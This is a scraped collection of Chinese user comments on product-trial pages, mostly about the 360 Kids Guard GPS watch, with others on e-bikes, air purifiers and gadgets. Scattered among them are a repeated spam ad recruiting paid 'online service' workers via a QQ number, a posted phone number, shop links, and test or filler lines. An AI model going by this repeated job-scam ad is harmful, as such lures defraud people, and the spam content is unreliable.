下一批得等到什么时候啊，急用啊，现在
大爱无疆啊，支持！
出来就入手，但更希望能被中签
想我所想，期待啊```
123123121131
很专业的评测，不是一般的用户级别啊
等待的望眼欲穿啊，什么时候能正式开卖呢，一定要抓紧啊！
啥时候给我闺女弄一个啊！快卖吧！
1000多的价格貌似有点贵哦，一共这6件？？
黑屏不能用，差评！！还不让我提交评论，差评差评差评差评差评！！
小平家乡卫士，期待新科技给家乡带来改变！对下一代太有用了！
这功能最重要是定位是否准确，尤其是一些小城市，如果这个定位定不好，就只能是花瓶了。
建议做的更小，更隐蔽，如果小孩知道了，人贩知道了，这个安全性能就打折扣了！
建议集成在鞋子，皮带，书包或者可以随身佩戴的装饰品里面
期待中，很高级的样子，我家住10楼，正好想买一台来净化空气呢
高端大气上档次，低调奢华有内涵~就是太贵了吧... 
是否可以防水
相信这款儿童手表会销路不错。如果价位合理的话也想购买一只!
最好做成鞋垫，放在鞋子里安全 
天灵灵，地灵灵，保佑我中签
是否可以做成纽扣或胸牌什么的,更隐蔽,更美观一点,
最重要的定位的准确性。。。而且如果同样的功能能做的隐蔽一些更好~~~如果小孩在大人找到之前被坏人控制了，把手环摘掉就失去了意义~
什么时候开卖呢
有低于设定温度就报警的功能更好，哈哈，喜欢喝温热水的筒子飘过
苦等儿童卫士1上市，没等来，却等到了儿童卫士2，希望尽快上市。 能做成越小越隐秘就更好了。期待中
傻了吧，高速公路上一般敏隔三十到四十公里就有休息区，而休息里面基本都有加油站。
很适合给父母等年纪大的人或者很小的小孩用，功能设计要比较的人性化哦，盒子的分区要做好哦，然后提醒时间什么的最好有声音提示，那就比较好啦：）
很好很靓的评测呀
嗯  不错   很有用的功能，，支持一下
酷啊，方便实用
不错，实用漂亮
的确高大上
好好好好好好
这车会不会被胖子一屁股给坐死啊 8900要是日元的话还值得考虑
这个怎么试用呢  请联系我15850017198
真心期待中，希望产品越出越好，质量过硬的产品才是我们的最佳选择
这个还是试验品吗？什么时候上市呢？你大爷的  都等这么久了 有研究导弹复杂吗？
搞活动总是抽不到，想给自家宝宝买一个还不开卖。什么时候上市啊。
现在购买 什么时候可以发货 这个很重要
这是个好东西，这样确实可以节省不少的成本啊。
比现在市面上那些华而不实的智能感应垃圾桶强多了，我家的智能垃圾桶真心成了摆设。
孩子正是6周多一点，正是淘气的时候，带出去玩，一不小心就不知道到那去了，心里那个急呀……天下父母心，大家都知道的，看了上而把产品说明。很是希望有一个，想着360能早上推出试用和正式品。期待中……一直关注中。
5555女汉子
谢谢亲支持！
3Q3Q!
孩子马上就要上学了，戴个360儿童卫生还能让我放心点，真心希望360早日开始正式出售
我一直参加奇酷试用活动，但一直没抽中我。第一次360儿童卫士1试用没有参加，一直后悔，从此一直参加试用，但一直没有我。这回有了360儿童卫士2的试用机会，我不想错过，况且我也很需要，就给我一次试用机会吧！
男孩子刚三岁多点，正是调皮倒蛋，愿意藏猫猫的年季，大人一步没跟上就可能跑没影了，而且现在刚好是懵懂期，很多事情说不清楚，家里都这一个，真很担心丢失或人贩子。看到有这样产品，真心想买一个。希望能早些实现产品化，努力参与这次活动。
1代没抢到 也没等到上市 这就变成2了 一定要抢到啊
不就是把手动调节速度换成了用脚控制，就是智能了 ，哈哈
谢谢天灵灵，地灵灵保佑我中500万
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请QQ练系主管 1605666135
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请练系主管1605666135
这个看起来还不错，关键能不能定位准确
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请练系主管1605666135
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请练系主管1605666135
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请QQ练系主管 1605666135
看起来不错哦，是不是能正确的定位呢
我日，电车有QS认证这车能吃吗！QS是食品，CCC才是丢脸
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请QQ练系主管 1605666135
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请QQ练系主管 1605666135
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请QQ练系主管 1605666135
看来大家蛮闲的,建议大家可以利用闲时间做一做网络服务人员,没做过也可以教你,报酬按天算,每天70到120,具体做什么请QQ练系主管 1605666135
真心希望尽快上市
近期医生体检显示：双肺均有磨玻状结节，本人不抽烟，周边人员也不抽烟。估计是空气的问题。现在有免费的360空气卫士试用，申请下，希望中签。
每天都来支持360！
nnnnnnnnnnnnnnnnnnnnnn
匹配问题还是没弄好啊，求助
低辐射，高性能，操作简单，准确定位，真是家长们的首选。 关注中......
期待很久，不知道功能怎样啊？希望一如既往的贴近民心。
期待中，希望车上能有这个用用
很漂亮，很时尚，更智能。
哈哈 支持盖四吗 
这个我需要。挂在钥匙，还有车钥匙上。
戴上的时候样子和奇怪！如果能集成到眼镜上，就好了。创意不错。
期待中.....................
如果是人贩子的话，你用这个也没有用。人贩子直接就从你的小孩子手上取下来丢掉了。你到哪里去找啊。
很好的样子，想试用，希望就此诞生一个响当当的中国伟大品牌
使用很方便，插入可上网的电脑的USB口，就可以将有线网络信号变为无线网络信号。 系统自动安装，提示360WIFI名称和密码，名称和密码都可以修改，密码可以隐藏。 东西小巧，可随身携带，特别方便在办公室或出差使用。同时还赠送10T的网络云盘。360考虑的是太周到了。
太贵了 坑傻子呢 有这钱为什么不买空气净化器
等的好辛苦
很好的东西 很好的
很好的东西 很好的
很好的东西 很好的
真的很好的东西
真的很好的东西
真的很好的东西
呵呵，可以到众筹网支持我们
做个项链样式的，带个视频监控的，手表对于小点的小孩来说是不是大了些！
很好的东西!
很好的东西! 
很好的东西! 
做成项链样式，或者其它隐蔽一些的！
感觉比第一代好了很多，期待
感觉比第一代好了很多，期待
买一个给陈晖戴
看起来很不错的样子啊！
这是一个新的评论
看起来很酷啊
真的很好，很想买一个
真的很好，很想买一个
一直提交不上来，不知怎么了，东西很不错，谢谢周总！好产品，大家一起分享！
真的很好，很想买一个
车载设备很有前途，看好
真的很好，很想买一个
新发布的，看起来很高端
赶紧开始试用吧
确实太贵了，坑爹啊
晕了！！竟然是安卓专用~~~~~~~~白买了！！！
看起来挺好啊
这个不错，看着比较有用，而且样子也很好，相信小朋友会喜欢
看起来不错，不知道重不重
需要看实际效果是不是值这个价格
看着不错，不知道实际效果怎么样，能不能经受起夏天汽车里的高温？
折叠完能上地铁吗？
希望小点！
东西真好!
非常的好，想要一辆
这。。。。。。。。。
好东西!好东西!
好像红外线和门磁少了点，另外红外线误报率蛮好的，最好能配能链接WIFI的摄像头
好东西!好东西!
好东西!好东西!
看起来挺好的
现在各种炫酷手表很多啊
123123
444444444444444
333333
111111
3333333
333333
样子不错，而且感觉很轻便的。市区里面骑行不错
123asf
不错不错，我喜欢滴，来一套~
啊啊啊啊啊啊
这个最好是更加隐蔽些，比如贴在鞋子上、包里、衣服内衬之类的。这个目前只是放走失，但不能放被拐卖
妹子不错！
最好 把 360的  LOGO隐藏或是 淡化，放到比较隐蔽的地方，这种类似监控和保护儿童安全产品，如果品牌效应高调就起不到保护的作用了。
建议产品的个性化儿童手表样式图片多一些，这样可以自由选择，如果大家一看这玩意就知道是GPS定位产品，那这个东西就是个豪头，啥作用都起不到了，这种产品的理念要强调  “私人定制”哪怕价位提高，也不是大众的地摊货，让人一看就是流水线出来的东西，大家见到这个样式，都知道是什么了，卖小孩的现在都是有文化的好不！！！！！
没有美女身材不幸福
联系麦步的售后了么？可以向他们反馈到底是什么原因
插入不了图片是什么提示呢？
占地好小的样子 放后备箱不错呢 期待新品
作为一保护儿童的产品，现在的设计已经足够，不需要太多功能和花哨，只要提高了定位准确性就行。但是希望360解决好电池容量和产品的耐脏性问题。建议手表表带可更换，这样360还可以出配件。
就是效果不知道有没有说的那么好，关键是价格
说实话 现在带孩子出去 都超级紧张 眼镜时刻不离开她的 社会早就了家长的警惕性 真的希望有一款超级定位 可以知道孩子的具***置 最好再搭配一个其他的设备 手表被摘除后仍然可以定位的 小巧一点 不容易发现的
能变速的话，就更完美了。
很科技，太贵，
最好可以再出可以挂在裤腰或者脖子上的版本，方便不同场景使用g
呃，呃，每次活动都参加，不知道这次能不能申请到啊！真心希望早点上市啊！！！！
5万9了，最后会破6万大关吗？
不错   挺好
还有朋友排行功能啊。挺好玩。
好像很NB的样子
真的希望能给糖糖领一个。
Mini 版还能支持 120 天的工作续航，真心不错了！加之优惠的价格，预计一定吸引很多人！
好喜欢呀，创意不错，希望能给宝贝申请到一个试用
不要日本货
建议增加防水功能，小孩子要玩水的啊。
额。。。奇酷，你这样可不好。。。我们靠专业博得好评，不拿那些来吸引看客。
赞一个……………………………
价格可以公开吗？
这个车不错我挺喜欢的。我想要一辆
已经预约过了，什么时候可以买？？？
关注很久了，有种很急迫的心情。
你这个，孩子大了懂了都不愿意带，
孩子小，真的很需要，看看放学有没有乱跑。360支持！
一不小心就看到了，原来还有这产品， 不错
我女儿5月16日刚好过5岁生日。真心希望能申请到360儿童卫士。
比第一期的好看多啦，呼呼···
其实小孩子的运动量很大，手表的透气功能也很重要，还有防摔，防水，防压等！
 小孩的东西，越小巧越好
不错 想要个
好东西，值得拥有。
一个199元啊
好期待，不要有玩的功能，小孩会分心
可惜不支持我的手机啊
看着不错，不知道多少人民币
100以上吧
期待明天11点开启咯~~
捉紧开启吧，我已经到了 
期待！！！！！！！！！！！！
试用名额太少，中奖希望渺茫，所以，关键是何时正式开卖。
这样的表带不好，小孩子会弄开的，建议改进下 
这个需要充电吗？
要是能配套摄像头+报警联动就更完美了
只能单单控制插座开关，还是欠缺点东西。如果能配合“小智”一起使用就更好了。
价格难以接受
希望比第一代更好用，设计参数更完善，如按键设计是否考虑小孩使用破坏力因素等，希望中一个！！
关注好久了，孩子上中班就开始看，看到现在的学前班，孩子马上生日了，希望送个安心给儿子！
很有质感的闹钟应用，放床头是件不错的事
轻便，时尚，活力，小巧。关键是长时间佩带舒适，定位精确，使用方便。
好想撸一个
这车分明是分分钟要丢的节奏啊
再有就是我等95kg的大汉起着好担心会压断那个车座的连接处啊
不知道这个杯子准备卖几位数啊
概念车，不太实用，中看不中用，这么高的价格买助力车比它强
价格真的贵啊，土豪用的，样子一般般，
贼偷着方便，也不能驮漂亮妹妹去玩，可惜了
我们也关注该产品很久了，希望能得到试用的名额。如果没有，我们买也可以。
目测有个字打错了，请看是不是，若是请改正，其中在  硬蛋    大赛中我们从几百个项目中脱颖而出并进入最终的总决赛top15项目。uPlane商标已经在国内注册。
希望该产品能早日上市开卖，好为自己的宝宝挑选一款喜欢的产品。为孩子的安全护航！！
上次都错过了，希望这次不要错过。期待！！
希望这次运气好
马上就开了，是不是已经定了都，好东西 期待
很好的产品，爱死你了
需要的客户可以到爱创意官方商城购买 http://aturey.taobao.com
很喜欢，希望今天能得到试用名额
就评论的已经246人，求参与！
一直密切观注360众多产品中的的这一款，期待幸运降临~
只关注这个。。 上次没申请上 希望这一次能幸运。
这个车很漂亮，又可以折叠，希望由一辆
期待我中奖！
上次都错过了，希望这次不要错过。期待！！
东西很小，但是很实用。设计很有想法。
小巧的电动车属于电动车的一个发展方向，但是目前在大城市，丢车真的是很大的问题，希望有比较有效的防盗措施
看介绍感觉好棒的说，带助力骑行，又可以健身还不累，真心不错……就是价格有点接受不鸟，俩月工资……
申请了几次都没申请到，希望这次能申请上
关注很久了。什么时间正式上线呀。能买个多好呀。说半天，也没有买个看看效果呀。
诺基亚的东西一向都非常好。。
可以变速，三速的
这样的话，外出骑行50km以上也没问题喽 
刚个性来，我喜欢···跪求上市时间··多少毛毛··
关注好久了！期待啊
感觉还蛮搭配这个手机的..
同样希望能够为孩子申请上，没孩子的就不要捣乱了吧。
不错，期待早日发布
¥ 2880.00 288 我就要一个
性价比的问题，类似产品还是比较多的
希望可以申请到，孩子已经期待很久了。
期待中，坐等！！！！
希望可以申请到，期待已久了
希望可以申请到，孩子已经期待很久了。  
申请了几次都没申请到，希望这次能申请上  
呃。。。奇酷你又调皮了吧？
希望这次申请到，孩子已经期待好久了。
期待很久了
外形很漂亮，特点很足，在小细节上能多多改进，如同灯饰，晚上能够更加方便，那就更加完美了！
希望可以申请到，孩子已经期待很久了。 
怎么样可以申请到名额呀?????
这个可以有!!!
期待！！！！！
期待中，小妞长大了，想多放她自己走走，如果能有儿童卫士保护我就放心了
关注很久了。什么时间正式上线呀。想买！！！！！！！
期待儿童卫士、希望能得到机会试用、
不错！！！！！！！！！！
非常期待。。。。。。
很不错的东西 希望可以申请到啊 孩子出去玩就可以放心了
联系了，客服说他不了解情况，具体他问问领导以后给我答复。。。
要是能做的在小点就好了 在手上太显眼了 好看是好看了 但是如果出事了别人也可以很快的拿下来 要是做小点能放在隐蔽的地方安全系数就会提高很多的
之前也想过这个产品，这个产品个头有点大，做成芯片样式。
现在类似这种GPS跟踪器市场很多，但正规厂家的还非常少，支持360自主研发产品，希望能够做的更好。
一直在关注，，希望有机会试用
期待幸运可以降临到我头上！
孩子每天40分钟在陆上，有它放心了，早出我还可以放狗身上，它也不会丢了 
期待已久，希望早点上市！
申请好几次了都没中，希望这次能领到，谢谢。
6-7岁，希望可以和儿童卫士手表一起见证孩子一步步独立成长！我们家到学校有多远，要有几个红灯。孩子你可以自己去上学了！
掏钱我都要，快点发行啊
期待360给孩子和家长一个安心的未来，期待能够试戴
想要宝宝 必须品哦 
这款产品太合适小孩子了.希望第一次申请就能中签啊.哈哈
电池续航怎样啊？
好啊  有了这个  钥匙钱包  遥控器都好找了  价钱几何啊
马上开始了，希望能中、、、
有时按键过于敏感，有时按键过于迟钝 
期待中一个，试试好用不
看着很牛 真想实际体验一下
已申请到一代期待申请到二代，可以详细滴对比下。
很渴望试用儿童手表，确保孩子时时在视线范围内
关注很久了，希望能一次中签啊，颜色很漂亮，功能待试用
很期待孩子能带上它。
希望能试到，关注快半年了还没上市
期待试用，不是说今天开放的么
准备开枪  开抢
能抢到么？
期待能如约抢到
先报个到..期待ing..
ready
我一定要中奖哦，报名了好几次了都
刚提交申请，希望能通过！
我一定要中奖哦，报名了好几次了都，家里挺需要的，刚刚装修好，都是味道
http://www.gome.com.cn/product/9128110219.html 可以买到
没有小孩的就不要起哄了
高科技产品问世无疑能发挥更为重要的作用。360公司又推出高科技电子产品“360儿童卫士2”手环。这款手环从技术到功能都可以说能能给孩子带来安全的保障，将全方位的保障儿童安全。是个好产品支持360、希望能得到试用机会、
提交申请了，希望能中签哦，分享到微博了
大家都是神速啊，就五分钟都靠近300啦
没有小孩的就不要起哄了
灰常同意你的建议
终于结束了、希望有我的、O(∩_∩)O哈哈~
申请到一代的也不要起哄了
东西已经收到，谢谢360，一直提交不上去评论，东西很好，很精致
不错的东西  很想体验一下
辐射大不大?
又多一个酷酷的玩物....不过，求Android版！
女儿快4岁了很调皮，就在2个月前的一天我看她走出了院子来家玩耍的哥哥跟着她。可意外还是发生了，因为家附近有一个池塘女儿调皮说去钓鱼结果掉进水里。真是不幸中的万幸，就在她掉进水里甚至都不知道发出求救声的时候，她哥哥猛的一把才把已经湿水而沉重的女儿拉了起来。每每回想起来还是后怕不已。关注儿童卫士已经很长时间了非常希望能第一时间用上。谢谢！
已经很有的朋友们就给我们个机会吧！
海选啊，第一次知道这个平台，有点相见恨晚的感觉，期待能万能中一。其实出于对360安全的信任，等等了，花钱买也值。
同意，支持！
好东西，对于我这种人很适应，期待啊！！
方便手机上网的好工具，妈妈再也不用担心路由器不行了。
期待儿童2快快到我家里来!!!
装饰品....
求手环.求试用
有了360WIFI，到哪都不怕没有网上~~
非常喜欢～～～期待
我发现你们的申请理由都很惨啊，黄牛和没有Baby的请别起哄行吗？
看来大家的热情很高啊！希望自己能抽中
为什么不针对老年人做一款这样的产品呢？他们也是很需要监护的呀
非常实用的
希望得到啊啊啊，给我妹妹！！！
对于想让孩子独立出行又不放心的家长，有帮助！
不错实用外观也很漂亮 
这个好 什么时间出啊这样我的汽车就可以时时监控了
这个很有用，期待
不错实用美观
很期待试用该产品谢谢。
我申请了，还是没一个机会，哎，还想买给我外甥女呢！
期待试用，给孩子更多的关爱
纽扣电池？？没电了怎么办？ 怎么不设计个太阳能、风能、光能充电的啊？？ 要不我用了6个月后，电池没电了，我还得换电池，多麻烦。
比一代产品漂亮多了。
怎么申请免费试用！
咱们买啊。
怎么样才可以买到啊
以为是开放购买，原来又是试用，又排到1K以外了，又没希望了。 每次试用都排不到，什么时候能开放购买啊？
看起来很不错，很想体验一下哦
可以改装一下给老人用嘛
根本就没有开卖啊，怎么都第二代了？
好产品，怎么不尽快生产，很纳闷！从关注手环到现在，小孩都已经上小学了，产品都还没上市！吊胃口！
申请好几次没成功
能快点上市就好，期待着用呢！
好东西！价格要是1500元-2000元就大卖||！
这个真心不错，当然，在家用不着，因为有无线路由，单身，在公司就方便多了，而且操作也简单
跪求产品，我已经申请了好长时间了，好的产品，也要懂人欣赏的人去用，去发觉他的优缺点，我一定会好好的写下我的试用心得。求试用。
上市开卖了吗？我想买
这个很实用，特别对我这种丢三落四的
第一次申请没成功啊好像
我是一个喜欢体验和喜欢尝试的人，会用客观公正的眼光来评判商品的真正价值和性价比，每次体验过后我都会认真的写心得体会，不仅是为了完成体验作业，更多 的是带给大家最公正最客观的体验报告！希望自己能有机会体验一下！希望能申请成功，试用过后再和朋友们们分享~(@^_^@)~！积极努力申请试用产品； 满怀期待等候审核结果；诚心诚意感受试用产品；尽心尽力撰写试用报告；这就是我的试用态度啦！哈哈！要申请成功！
杯子不错！但是我想价格应该不会太亲民....
好难申请下来啊！
第三次申请了，我真的很需要这个东西，什么，让我中吧！
什么时候上市啊，翘首期待
最喜欢闹钟了，酷酷的。
看着不错的样子
1代都没见过，又2代了，忽悠..
期待，新的论文伴侣……
作为一个父亲一个产品经理，我确信我可以提供更好的产品使用体验说明
等待ing，焦人得很
希望儿童卫士尽快上市，为爸爸妈妈多添一份对宝宝的呵护，要加油哦！
有意思。。。
呵呵，科技控的父亲和小科技控的女儿都期待试用！呵呵
喜欢，继续关注！
宝贝非常不错！一直使用，信赖360产品，申请不易，且耐心且等待！众在参与！
我是上一次申请成功的用户，可是到现在还没看到产品，怎么回事呀？希望这一次不要让我失望！
期待中，上次错过，希望这次能实际体验一下
看上去很不错的一款东东，真的特别想试试，希望能够拥有这个机会，记得阿基米德说过，给我一个支点，我可以跷起整个地球。我要说，给我一个机 会，nothing is impossible （一切皆有可能），我会给你一份详尽的、真实的、完美的试用报告，当然，还有我身边的那一群网购成瘾的JJMM们，相信她们会成为您的下一个顾客的！ (*^__^*) 嘻嘻……，热切期盼中ing。。。
很想买来体验一下
很期待！ 对丢三落四的人是个好东西
适合家有小顽皮的我，我们两岁了，正是好奇世界的时候，每次出门都爱挣脱大人的手，左看右摸的，希望得到360试用，这样我就不怕小宝贝会迷失方向咯
一直关注360的每一款产品，儿童类的更是良心之作，赞。
试用报告在哪里写啊？
这个可是好事 
电池还是最大的问题
上次申请没成功这次又申请了，希望成功！
来吧手环，送给女儿的儿童节礼物
男孩爱玩爱动，一不留神就不知道钻到哪个角落了，有了贴身守护，关爱随行的儿童卫士，孩子的耳边就会少了许多限制性要求，活动范围会越大，谢谢奇酷！
宝贝非常不错！一直使用，信赖360产品，申请不易，且耐心且等待！众在参与！
希望能申请到
希望可以申请到。。。
非常非常非常地期待。
不知道干什么用的
从一代开始关注，也申请了很多次都没申请到，希望这次能够成功， 
求选中，，家里新房子装修好三层了。全是甲醛跟苯的味道。伤不起。
这个真心不错
这个真心不错，从此免费上网
先开始销售吧，以后有更好的我们再换，很需要这个东西
提个建议吧，能不能在表带上做个锁什么的，防止小朋友把它给取下来，（比如说加个大人的指纹解锁什么的，或者是密码之类的。）还有就是续航，可以加装太阳能电池么？
希望能通过 谢谢！
这个表面材质如何？最好耐磨一点的
女儿是个不折不扣的假小子 调皮死了 希望360能通过我的请求 让担心和烦恼被一扫而光！
再好的东西，先给我来一发用用，实践是检验真理的唯一标准
同事介绍的，希望能申请成功，多给孩子一份保障
相信360 安全带回家
一代，我申请过，没有成功；二代，再次申请，必须有啊。
很需要这个东西,现在用手机来记录
360的老朋友了，支持
360，你有我们的支持！
试目拟待。。。。。。  
现在的小孩子比我们小时候难带多了，虽说这样说明他们比我们在进步，但是有时候不免调皮捣蛋，整天不知道跑哪里玩去了有时候真的担心，希望可以申请到360的儿童卫士，可以解决我的后顾之忧
很给力的评测啊。可以分享到锋芒小栈-社区哦
支持一个。。。也可以分享到锋芒小栈-社区网站上面哦，让更多的人去看
前来支持 可惜我没有中。你可以分享到锋芒小栈-社区网站上面吗 
期待这个，老妈总是丢钥匙，不知道这个怎么样
不知道能不能抽中为，新房刚装修好，用这个来试试~~
希望能够申请得到  希望360在保护我们电脑的同时  也能给孩子带来安全保障  谢谢！
在用920，对我这就是福音。
希望能够通过，期盼！
希望续航能力强一点
额，25m/s的量程啊。。。看来测不了台风了。如果量程有75m/s的话，相信风吧肯定有人要来买的
希望被选中！！！！！！！！！！~~~
先量产吧，由市场决定到底好不好
真心求通过，孩子马上上幼儿园了，心里老是不放心
支持360 
希望再度燃起，上次没有通过，期待这次能够通过，大婶，给过吧！
简单说摄像机如果是模拟系统就别造了。。
这个产品值得期待，希望通过。
什么时候能生产
再一次申请，到我碗里来。
8900啊？有点贵了
好先进啊，期待
一直不能量产吗？等的花儿都解了
真心希望尽快上市开卖，我周围的朋友们都在等呢。
从360儿童安全卫士刚出来，我就开始关注。现在360儿童安全卫士2也出来了，由原来的淡蓝色变成了红色，表盘设计更精美，更小巧了，更加适合孩子佩戴。最重要的是他精准的定位，让孩子的出行更安全，让父母更放心。
才发现，原来360儿童安全卫士2有多重颜色，而不是单一的一种颜色，大家完全可以根据自己的喜好来进行选择，赞一个
希望这次通过~~  
希望能通过啊,家里两个孩子伤不起啊
申请人挺多的，希望能通过``
好像要啊，希望能过~~~~
我想提点小建议： 1、颜色建议黑色的好，现在的孩子很会玩，表带不一会儿就弄脏了； 2、最好加入范围限制功能，超过一定区域就发出警报声，这样孩纸肯定不会走丢了。
再一次申请，到我碗里来
马上要揭晓最终的谜底了好紧张
希望能够通过，让宝宝更安全，让我更放心
再次申请...
太贵了1千到两千火爆热卖
家里刚装修完，我就看看好不好用。多推广给我的邻居
这个真是不错，想要一个，不过估计价格不会便宜，应该是买不起！
第二次申请，希望能够通过啊 
这个货哪块智能了？可以自己变形吗？
为什么要限于儿童呢？老人也需要啊，要带姥姥出门旅行了，防止走散，希望能通过。
好想要，希望能申请成功
第二次申请了。增加了运动监测。。不错。。我会继续关注
再次申请!
要是这个也能免费申请剧好了也，最好我能中 啊
爱死了，爱死了
希望能抽中我们
继续申请喽~~~~~~
真是不错的产品，为了孩子安全，果断申请了。。。
我孩子在放学时，就曾跑丢过，当时心情可想而知，所以这次申请，我特别希望被选上！
家有小孩3岁，正想申请儿童卫士，希望能抽中！！
这次100个，但愿能抽中啊~
我儿子3岁半了，希望管管能放手一个，让老婆和我上班时不再担心~！
此物如此美丽，心动；让我们期待。
我要申请到啊。。。。
确实是光纤入户，然后接光猫（光电转换器），出网线连接电脑，你孤陋寡闻了吧
谢谢，没想到这么快360儿童卫士的第二代就出来了。期待定位与三防方面的改进。
市面上有N多定位器
我已经提交过了啊。。。。
很漂亮，关注很久了
老人需要防走失，但不需要防拐卖，所以口袋放个手机或者卡片就可以解决问题。
这个价格有些高，如果能降低成本，倒是很不错。
第二次申请了，已经关注了快一年了！非常希望得到360的这个产品。祝自己好运！！
对我们这种孩子小的家长来说，最希望有的功能就是离开身边超过30米自动报警功能，尤其是孩子交给年龄大的父母看管的时候，父母有时候记性不好，或者疏忽，孩子就容易跑远~
1000-2000，那是普通自行车，我感觉5000以下都能接受
什时候能正式上市啊，期待。
对于我们这种经常在外地的人！希望有一个能时刻关注孩子动态的东西！真的很希望！
有木有自行车版的 
这个产品非常好，一般家庭都会很需要，给别说特殊家庭了，对孩子提供了更多一层的保障，就是出的太慢了，捉急呀！
亲爱的奇酷网会员，请上传一张头像吧~
这个是不是需要在手表中装入一个sim卡？
实际上就是一部不能通话的手机？
开着喜欢，很有现代感！
同类产品很多,但是我希望我们360的产品能够做到定位精准(大多数产品做的不到位,直接影响大家的口碑),耗电低(试想谁希望经常性需要记得给它充充电才能用,还用不了几天),做工精美(苹果成功的很大一个原因就是他的产品个个都像艺术品),另外尽量少的误报(狼来了的次数多了,大家也就都不信你了)
同样啊，要不快点开卖吧，不要学破小米了，搞什么抢购，掉消费者的胃口，让其他公司抢了先机，伤了忠实粉丝的心，丢了市场就麻烦了。
这一款多少钱啊  
我也希望能尽快上市，小孩的安全最重要！便宜实用最好！
该产品远距离不行吗？我在家，孩子在学校不能确定吗
不错的idea
就一细头热熔枪，3D打印机也就是程序控制的热熔枪，只是出料口细些而已。
 赞同，。，。
好东西，如果孩子玩耍时能够事先设定玩耍场地半径，超出自动报警，应该很不错的
test123
这车工业设计的不错，创意很好，8900的价格高了，3000-4000左右可接受。
很期待  希望好运砸中我吧 
挺好啊！好像国外有这种东西了！
刚好孩子要上小学了，希望有好运，给孩子一个安全礼物！
2000zuoyou
孩子马上上小学了，希望 360 能送孩子一个安全礼物
这个送给妈妈确实很好~
这个确实挺好的
越来越好，越来越强大了，顶起
我希望不仅有定位，还能知道距离我的方位和大约距离是多少米，像那个快的打车一样，距离您还有多少米，那就更厉害了。
1000 还行
一点消息都没有  
149人民币
希望对孩子的运动情况及安全有所帮助。
无论添加几张 都显示上传失败 我用手机 用电脑都试过了！！！
123123123
很可爱了嘛，蛮喜欢滴。
赞个  主要是定位的准确性！！～  
哥们你做梦呢，8900人民币，
赞个！但是最后那个猩猩的图。。。。我吃饭着呢。。。。
哈哈，好东西，支持360全部
一个能够遥控报警更好，视野看不见了按一下就报警随着距离远近可以控制声音大小
1：造型可爱。2：功能强大且实用。3儿子超喜欢。4：因为我是外地人在本地做生意，孩子出去玩也不放心。5;这一下解决了全部问题，超喜欢！
就是不知道价格，要便宜我也想买。
那样电量估计撑不到半天就关机了
8900啊。。。。。。。。
支持一下，希望有好的结果
  个人感觉创意还是非常好的，与现代高科技应用相得益彰，科技感十足。但感觉是定位在中高端消费人群中，即是富豪们拿来休闲出行的一种体验！就现在中国普遍消费者能力，此产品很难做到普及，当然几十年后就难说了。但本人非常支持此类科技创新与生活结合在一起,科技为生活赋予更多的便利和惊喜！不过还是厂家能稍微把价格降一些，惠民利国，相信企业也会走得更远！
外观真的好好支持奇酷，就是能不能快点公布结果，弄得我好紧张 
看着很好，一定能受欢迎，创意很好，支持大力支持
质量不错功能实用.
支持360
不错，可以考虑
如果可以，我也很期待哦！！
期待早日上市。6月1号最好呵呵
嗯，不错。再贵也要买给父母。
我想给我妹妹一个
家长朋友们超喜欢，希望早点上市。
可以给我们用一下
切，我家的电动都有这只能啦！！而且不超过一千
我也很喜欢哦
手机经常不记得放哪里了，出门还经常忘带手机，对于忘性大的人很有用
东西不错，确实不便宜
这个设计很好，很适合现在的家庭使用，特别是80后家庭！
不错的设计理念，绿色出行，它将给拥挤的都市生活增添一分新色彩。
不错，价钱合理就买
1024KB不是=1MB？？联芯4G芯片标称的下行150Mbps，上行50Mbps。按1Mbps=125KBps计算，其理论***为每秒18.75M。
第一代和第二代赶紧上市啊！不能学小米。期待！
希望电池耐用点，中等强度至少于用48小时
5.15开始发售
怎么申请试用啊？
尽快上市。希望时间持久更长、
期待它的精准！
希望尽快上市，产品一定会大卖
什么时候发货？
看上去比较科幻，我喜欢
这个排版效果真的太无情了...强烈要求奇酷官方解决一下! Word排版花了一个多小时,提交的时候惊讶地又排了半个小时.结果显示出来还是各种问题.
支持支持支持 
写得很不错，强烈要求奇酷官方升级编辑器，现在的太弱了。很不好排版。
孩子还不到一岁，不过先有个这个也是很好的，希望能中一个，呵呵
我也希望中一个
不好用，手机不兼容
快到家里来
新装修的房子，希望能够做试用，快到碗里来
新版智键不能按2下了，还是按2下，可以设置2个功能的比较给力，还望工作人员改进。使用过程中，有时候按一下，会没效果，非要使劲按一下，可能是灵敏度不够高。先说这些吧，以后发现问题再来叙述。
我很像需要一个！！！
什么时间能上市已经等了快一年了 
我点了免试用怎么不行呀
支持360.希望这次我们家有好运哦
距离上次试用已有近两月，自上次提交试用报告后，非常惊喜。永远只申请用得着的产品，永远对每一次试用负责，绝不随便申请浪费名额。力挺官方！！！此次申请后，我将争取第一时间成为手环的代理商，我相信产品的力量，我更相信广大和我闺女一样的孩子们需要这个守护神。
希望360不断推新更科技、更智能、更眩目的产品陪伴和见证每一个宝宝的成长！
即使拿不到试用，能尽快上市吗？很需要这样的一款产品。
这个出来装逼的人要小心 自己的手，到时候@杀手@随时会出现
老人用实用，希望尽早有样品试带或购买…
这是为社会制造福利，多少家庭免于丢失孩子的痛苦，支持360
明明可以叫宠物追踪器吗
希望360不断推新更科技、更智能、更眩目的产品陪伴和见证每一个宝宝的成长、让每位家长放心
新装修的房子，希望能够做试用，快到碗里来
外观真的好好支持奇酷，就是能不能快点公布结果，弄得我好紧张
马上要揭晓最终的谜底了好紧张 
创意很好，支持!
创新设计，绿色出行从我做起，低能降耗减少城市压力，改变出行观念；智能环保，伴我出行。
我最关注的功能，1电池续航   2定位精准度  3表带有锁定功能，防止小孩把表解下来玩的丢了，望早日上市，我第一个买
支持绿色出行 天才的设计想法
支持360
